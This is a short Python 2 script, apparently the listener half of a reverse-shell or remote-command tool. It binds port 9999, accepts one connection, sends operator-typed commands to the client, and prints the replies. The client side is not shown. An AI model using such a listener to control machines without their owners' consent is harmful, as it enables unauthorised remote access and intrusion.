# -*- coding: cp1254 -*-

__author__ = "bomch4nte"
__date__ = "17.12.2017"


import socket
import sys
import os
import time

# Connect to socket.

def socket_create():
    try:
        global host
        global port
        global s
        host = '0.0.0.0'
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))


# Bind socket to port.

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding Error : " + str(msg) + "\n" + "Retrying...")
        socket_bind()

# Establish a connection with client (socket must be listening).

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP : " + address[0] + "Port : " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands

def send_commands(conn):
    while True:
        cmd = raw_input("$~ ")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = conn.recv(1024)
            print(client_response)

def main():
    socket_create()
    socket_bind()
    socket_accept()


main()